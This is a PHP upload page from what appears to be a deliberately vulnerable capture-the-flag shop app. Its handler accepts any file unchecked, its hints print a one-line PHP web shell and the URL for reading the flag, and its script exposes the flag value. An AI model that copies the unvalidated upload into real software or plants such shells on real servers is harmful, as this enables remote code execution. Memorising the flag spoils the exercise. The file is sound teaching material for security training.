<?php
require_once 'config.php';

$message = '';
$error = '';
$uploaded_files = [];

// Get list of uploaded files
$upload_dir = __DIR__ . '/uploads/';
if (is_dir($upload_dir)) {
    $files = scandir($upload_dir);
    foreach ($files as $file) {
        if ($file !== '.' && $file !== '..') {
            $uploaded_files[] = $file;
        }
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload'])) {
    $file = $_FILES['upload'];
    
    if ($file['error'] === UPLOAD_ERR_OK) {
        $filename = $file['name'];
        $temp_path = $file['tmp_name'];
        $upload_path = $upload_dir . $filename;
        
        // VULNERABILITY: No file type validation or sanitization
        // Accept any file and move it with original filename
        if (move_uploaded_file($temp_path, $upload_path)) {
            $message = "File uploaded successfully: $filename";
            $uploaded_files[] = $filename; // Add to list
        } else {
            $error = "Failed to move uploaded file.";
        }
    } else {
        $error = "Upload error code: " . $file['error'];
    }
}
?>
<!DOCTYPE html>
<html lang="en" data-theme="light">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Upload - SecureShop</title>
    <style>
        :root {
            /* CSS Custom Properties for theming */
            --primary: #3b82f6;
            --primary-dark: #1e40af;
            --secondary: #8b5cf6;
            --accent: #06b6d4;
            --success: #10b981;
            --warning: #f59e0b;
            --error: #ef4444;
            --bg: #0f172a;
            --surface: #1e293b;
            --card-bg: rgba(30, 41, 59, 0.8);
            --text: #f8fafc;
            --text-secondary: #cbd5e1;
            --border: rgba(255, 255, 255, 0.1);
            --shadow: rgba(0, 0, 0, 0.2);
            --glow: rgba(59, 130, 246, 0.2);
            --glass-bg: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.1);
        }

        [data-theme="light"] {
            --bg: #f8fafc;
            --surface: #ffffff;
            --card-bg: rgba(255, 255, 255, 0.9);
            --text: #1e293b;
            --text-secondary: #64748b;
            --border: rgba(0, 0, 0, 0.1);
            --shadow: rgba(0, 0, 0, 0.1);
            --glow: rgba(59, 130, 246, 0.1);
            --glass-bg: rgba(255, 255, 255, 0.7);
            --glass-border: rgba(0, 0, 0, 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, var(--bg) 0%, var(--surface) 100%);
            color: var(--text);
            line-height: 1.6;
            min-height: 100vh;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 2rem;
        }

        .glass-container {
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            border-radius: 12px;
            padding: 2rem;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .glass-container:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 40px var(--shadow);
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        .form-group label {
            display: block;
            margin-bottom: 0.5rem;
            color: var(--text);
            font-weight: 500;
        }

        .form-control {
            width: 100%;
            padding: 0.75rem;
            border: 1px solid var(--border);
            border-radius: 8px;
            background: var(--card-bg);
            color: var(--text);
            font-size: 1rem;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            backdrop-filter: blur(10px);
        }

        .form-control:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 3px var(--glow);
            transform: translateY(-1px);
        }

        .btn-gaming {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            border: none;
            padding: 0.75rem 1.5rem;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            font-size: 0.875rem;
            width: 100%;
        }

        .btn-gaming:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.3);
            background: linear-gradient(135deg, var(--primary-dark), var(--secondary));
        }

        .btn-gaming:active {
            transform: translateY(0);
        }

        .alert {
            padding: 1rem;
            border-radius: 8px;
            margin: 1rem 0;
            font-weight: 500;
        }

        .alert-success {
            background: rgba(16, 185, 129, 0.1);
            border: 1px solid rgba(16, 185, 129, 0.2);
            color: rgb(16, 185, 129);
        }

        .alert-error {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.2);
            color: rgb(239, 68, 68);
        }

        code {
            background: rgba(0, 0, 0, 0.5);
            padding: 0.2rem 0.4rem;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            color: var(--accent);
        }

        details {
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 1rem;
            transition: all 0.3s ease;
        }

        details[open] {
            border-color: var(--accent);
            background: rgba(6, 182, 212, 0.05);
        }

        summary {
            font-weight: 600;
            margin-bottom: 0.5rem;
        }

        pre {
            white-space: pre-wrap;
            overflow-x: auto;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .container {
                padding: 1rem;
            }
            
            .glass-container {
                padding: 1rem;
            }
        }
        
        /* Improved Header Styles */
        header#main-header {
            background: linear-gradient(135deg, hsl(217, 91%, 60%), hsl(193, 95%, 68%));
            backdrop-filter: blur(20px); border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            position: sticky; top: 0; z-index: 1000; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        [data-theme="dark"] header#main-header {
            background: linear-gradient(135deg, #0f1419, #1e293b);
            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
        }
        .nav-link {
            color: white; text-decoration: none; font-weight: 500; 
            padding: 0.5rem 1rem; border-radius: 8px; 
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); 
            position: relative; overflow: hidden;
        }
        .nav-link:hover {
            background: rgba(255, 255, 255, 0.1); 
            transform: translateY(-2px); 
            box-shadow: 0 0 20px rgba(59, 130, 246, 0.3);
        }
        [data-theme="dark"] .nav-link:hover {
            background: rgba(255, 255, 255, 0.15);
            box-shadow: 0 0 20px rgba(139, 92, 246, 0.4);
        }
        .theme-toggle {
            background: rgba(255, 255, 255, 0.1); 
            border: 1px solid rgba(255, 255, 255, 0.2); 
            border-radius: 50px; padding: 0.5rem 1rem; 
            color: white; cursor: pointer; 
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); 
            font-size: 1rem;
        }
        .theme-toggle:hover {
            background: rgba(255, 255, 255, 0.2); 
            transform: scale(1.05);
        }
        [data-theme="dark"] .theme-toggle {
            background: rgba(139, 92, 246, 0.2);
            border-color: rgba(139, 92, 246, 0.3);
        }
        [data-theme="dark"] .theme-toggle:hover {
            background: rgba(139, 92, 246, 0.3);
            box-shadow: 0 0 15px rgba(139, 92, 246, 0.4);
        }
    </style>
</head>
<body>
    <header id="main-header">
        <nav style="max-width: 1200px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; padding: 1rem 2rem;">
            <a href="index.php" style="font-size: 1.8rem; font-weight: bold; color: white; text-decoration: none; display: flex; align-items: center; gap: 0.5rem; text-shadow: 0 0 10px rgba(255, 255, 255, 0.3); margin-left: -1rem;">
                <img src="assets/logo.png?v=20251002" alt="SecureShop Logo" style="width: 40px; height: 40px; object-fit: contain;">
                <span class="logo-text">SecureShop</span>
            </a>
            
            <button id="mobile-menu-toggle" style="display: none; background: rgba(255, 255, 255, 0.1); border: none; color: white; font-size: 1.5rem; padding: 0.5rem; border-radius: 8px; cursor: pointer;" onclick="toggleMobileMenu()">☰</button>
            
            <ul style="display: flex; list-style: none; gap: 2rem; align-items: center; margin: 0; padding: 0;">
                <li style="display: flex; align-items: center;"><a href="index.php" class="nav-link">Home</a></li>
                <li style="display: flex; align-items: center;"><a href="products.php" class="nav-link">Products</a></li>
                <li style="display: flex; align-items: center;"><a href="search.php" class="nav-link">Search</a></li>
                <?php if (isset($_SESSION['username']) && $_SESSION['username'] !== 'guest'): ?>
                    <li style="display: flex; align-items: center;"><a href="upload.php" class="nav-link">Upload</a></li>
                    <li style="display: flex; align-items: center;"><a href="download_invoice.php" title="Access your purchase invoices" class="nav-link">Invoices</a></li>
                    <?php if ($_SESSION['role'] === 'admin'): ?>
                        <li style="display: flex; align-items: center;"><a href="admin.php" class="nav-link">Admin</a></li>
                    <?php endif; ?>
                    <li style="display: flex; align-items: center;"><a href="logout.php" class="nav-link">Logout (<?= htmlspecialchars($_SESSION['username']) ?>)</a></li>
                <?php else: ?>
                    <li style="display: flex; align-items: center;"><a href="login.php" class="nav-link">Login</a></li>
                    <li style="display: flex; align-items: center;"><a href="register.php" class="nav-link">Register</a></li>
                <?php endif; ?>
                <li style="display: flex; align-items: center;"><button onclick="toggleTheme()" class="theme-toggle">🌙</button></li>
            </ul>
        </nav>
    </header>

    <main>
        <div class="container">
            <div class="glass-container" style="max-width: 800px; margin: 2rem auto;">
                <h1 style="color: var(--primary); text-align: center; margin-bottom: 2rem;">📁 File Upload System</h1>
                
                <?php if ($message): ?>
                    <div class="alert alert-success"><?= htmlspecialchars($message) ?></div>
                <?php endif; ?>
                
                <?php if ($error): ?>
                    <div class="alert alert-error"><?= htmlspecialchars($error) ?></div>
                <?php endif; ?>
                
                <!-- Upload Form -->
                <div class="glass-container" style="margin: 1.5rem 0;">
                    <h3 style="color: var(--accent); margin-bottom: 1rem;">📤 Upload Files</h3>
                    <p style="margin-bottom: 1.5rem; opacity: 0.8;">
                        Upload product images, documents, or other files to share with the community.
                    </p>
                    
                    <form method="POST" enctype="multipart/form-data" style="display: grid; gap: 1rem;">
                        <div class="form-group">
                            <label for="upload">Select File:</label>
                            <input type="file" id="upload" name="upload" class="form-control" required 
                                   style="padding: 0.5rem;">
                        </div>
                        
                        <button type="submit" class="btn-gaming">Upload File</button>
                    </form>
                </div>

                

                <!-- CTF Challenge Information -->
                <div style="margin-top: 3rem; padding: 1.5rem; background: rgba(239, 68, 68, 0.1); border-radius: 8px;">
                    <h3 style="color: rgb(239, 68, 68); margin-bottom: 1rem;">🎯 File Upload Challenge</h3>
                    <p style="margin-bottom: 1rem;">
                        <strong>Objective:</strong> Upload a PHP shell and use it to read the secret flag file.
                    </p>
                    
                    
                    
                    <details style="margin: 1rem 0;">
                        <summary style="cursor: pointer; color: var(--accent); font-weight: 600;">💡 Hint 1 - File Type Restrictions</summary>
                        <p style="margin-top: 0.5rem; opacity: 0.8;">
                            The upload system might not be checking file types properly. Try uploading a PHP file.
                            <p style="margin-bottom: 1.5rem;">
                        <strong>Flag Location:</strong> <code>src/files/manual_secret.txt</code>
                    </p>
                        </p>
                    </details>
                    
                    <details style="margin: 1rem 0;">
                        <summary style="cursor: pointer; color: var(--accent); font-weight: 600;">💡 Hint 2 - PHP Web Shell</summary>
                        <p style="margin-top: 0.5rem; opacity: 0.8;">
                            Create a simple PHP shell: <code>&lt;?php system($_GET['cmd']); ?&gt;</code> and save it as shell.php
                        </p>
                    </details>
                    
                    <details style="margin: 1rem 0;">
                        <summary style="cursor: pointer; color: var(--accent); font-weight: 600;">💡 Hint 3 - Reading Files</summary>
                        <p style="margin-top: 0.5rem; opacity: 0.8;">
                            After uploading shell.php, access it at uploads/shell.php?cmd=cat%20files/manual_secret.txt
                            <!-- Example PHP Shell Code -->
                <div style="margin-top: 2rem; padding: 1rem; background: rgba(34, 197, 94, 0.1); border-radius: 8px;">
                    <h4 style="color: rgb(34, 197, 94); margin-bottom: 1rem;">💻 Example PHP Shell Code</h4>
                    <pre style="background: rgba(0,0,0,0.8); color: #00ff00; padding: 1rem; border-radius: 4px; overflow-x: auto; font-family: 'Courier New', monospace;"><code>&lt;?php
   echo "<h3>File Reader Shell</h3>";
   $file = $_GET['file'] ?? '../files/manual_secret.txt';
   echo "<pre>";
   echo "Reading: $file\n\n";
   if (file_exists($file)) {
       echo file_get_contents($file);
   } else {
       echo "File not found!";
   }
   echo "</pre>";
   ?&gt;
&lt;!-- Access with: uploads/shell.php?cmd=your-command --&gt;</code></pre>
                    <p style="margin-top: 1rem; font-size: 0.9rem; opacity: 0.8;">
                        Save this code as shell.php and upload it to execute system commands.
                    </p>
                </div>
                        </p>
                    </details>
                </div>

                

                
    </main>

    <footer id="site-footer" 
        style="text-align: center; padding: 40px 20px; 
               font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
               background: linear-gradient(135deg, var(--bg), var(--surface)); 
               color: var(--text); transition: all 0.3s ease;">
  
  <div style="max-width: 800px; margin: 0 auto;">
    <h3 style="font-size: 1.8rem; margin-bottom: 15px; color: var(--primary); 
               text-shadow: 0px 0px 8px var(--glow);">
      🛡️ SecureShop
    </h3>
    <p style="font-size: 1rem; line-height: 1.6; color: var(--text); opacity: 0.85;">
      Your premier destination for cutting-edge gaming gear and cybersecurity tools. 
      We're committed to providing secure, high-quality products for tech enthusiasts worldwide.
    </p>
  </div>

  <div style="margin-top: 25px; font-size: 0.9rem; 
              border-top: 1px solid var(--border); 
              padding-top: 15px; color: var(--text); opacity: 0.6;">
    © <?= date("Y") ?> SecureShop. All rights reserved.
  </div>
</footer>





    <!-- Flag Celebration System -->
    <script src="js/flag-celebration.js"></script>
    
    <script>
        // Theme Management System
        class ThemeManager {
            constructor() {
                this.init();
            }

            init() {
                // Load saved theme or default to dark
                const savedTheme = localStorage.getItem('theme') || 'dark';
                this.setTheme(savedTheme);
                
                // Set up theme toggle listeners
                this.setupEventListeners();
            }

            setTheme(theme) {
                document.documentElement.setAttribute('data-theme', theme);
                localStorage.setItem('theme', theme);
                
                // Update toggle button text
                const toggleBtn = document.querySelector('button[onclick="toggleTheme()"]');
                if (toggleBtn) {
                    toggleBtn.textContent = theme === 'dark' ? '☀️' : '🌙';
                }
            }

            toggleTheme() {
                const currentTheme = document.documentElement.getAttribute('data-theme');
                const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
                this.setTheme(newTheme);
            }

            setupEventListeners() {
                // Override the global toggleTheme function
                window.toggleTheme = () => this.toggleTheme();
            }
        }

        // File Upload Enhancement
        class UploadHandler {
            constructor() {
                this.init();
            }

            init() {
                this.setupFileInputListeners();
                this.checkForUploadSuccess();
            }

            setupFileInputListeners() {
                const fileInput = document.querySelector('input[type="file"]');
                if (fileInput) {
                    fileInput.addEventListener('change', (e) => {
                        this.handleFileSelection(e.target.files[0]);
                    });
                }
            }

            handleFileSelection(file) {
                if (file) {
                    console.log(`Selected file: ${file.name} (${file.size} bytes)`);
                    
                    // Visual feedback
                    const fileInput = document.querySelector('input[type="file"]');
                    if (fileInput) {
                        fileInput.style.borderColor = 'var(--success)';
                    }
                    
                    // Check if it's a potentially executable file
                    const executableExtensions = ['.php', '.php3', '.php4', '.php5', '.phtml', '.pht'];
                    const fileExt = file.name.toLowerCase().substring(file.name.lastIndexOf('.'));
                    
                    if (executableExtensions.includes(fileExt)) {
                        console.log("%c🎯 DETECTED: Potential PHP shell upload!", 
                            "color: #ff6b6b; font-size: 14px; font-weight: bold;");
                        console.log("%cAfter upload, access it at: uploads/" + file.name, 
                            "color: #ffd700; font-size: 12px;");
                    }
                }
            }
            
            checkForUploadSuccess() {
                // Check if a PHP file was just uploaded (look for success message)
                const successAlert = document.querySelector('.alert-success');
                if (successAlert && successAlert.textContent.includes('.php')) {
                    const filename = successAlert.textContent.match(/[\w.-]+\.php[\w.-]*/i);
                    if (filename) {
                        console.log("%c✅ PHP File Uploaded Successfully!", 
                            "color: #10b981; font-size: 16px; font-weight: bold;");
                        console.log("%c🔗 Access it at: uploads/" + filename[0], 
                            "color: #06b6d4; font-size: 14px;");
                        console.log("%c🎯 Try reading the flag: uploads/" + filename[0] + "?file=../files/manual_secret.txt", 
                            "color: #ffd700; font-size: 12px;");
                    }
                }
            }
        }
        
        // Upload Flag Challenge System
        // This creates a global object that attacker's shell can trigger
        window.uploadFlagCapture = function(flagText) {
            if (flagText && flagText.includes('THM{')) {
                console.log("%c🎉 FLAG CAPTURED FROM FILE!", 
                    "color: #00ff00; font-size: 20px; font-weight: bold;");
                    
                showFlagCelebration(
                    flagText,
                    'File Upload',
                    'You successfully uploaded a PHP shell and read the secret flag file! This demonstrates a critical Remote Code Execution vulnerability.'
                );
                
                return true;
            }
            return false;
        };

        // Auto-detect flag in page content (if shell shows it)
        function detectFlagInPage() {
            const bodyText = document.body.textContent;
            const flagPattern = /THM\{upload_rce_read_2025\}/;
            const match = bodyText.match(flagPattern);
            
            if (match) {
                // Small delay to ensure celebration script is loaded
                setTimeout(() => {
                    showFlagCelebration(
                        match[0],
                        'File Upload',
                        'You successfully uploaded a PHP shell and read the secret flag file! This demonstrates a critical Remote Code Execution vulnerability.'
                    );
                }, 500);
            }
        }

        // Initialize when DOM is loaded
        document.addEventListener('DOMContentLoaded', () => {
            new ThemeManager();
            new UploadHandler();
            detectFlagInPage();
        });

        // CTF Development hints
        console.log("🎯 File Upload Challenge: Try uploading executable files like PHP scripts");
        console.log("🔍 Uploads directory is web-accessible at: uploads/");
        console.log("💡 Target file: files/manual_secret.txt");
        console.log("📝 After uploading a shell, you can call uploadFlagCapture('THM{...}') to trigger celebration");
    </script>
</body>
</html>
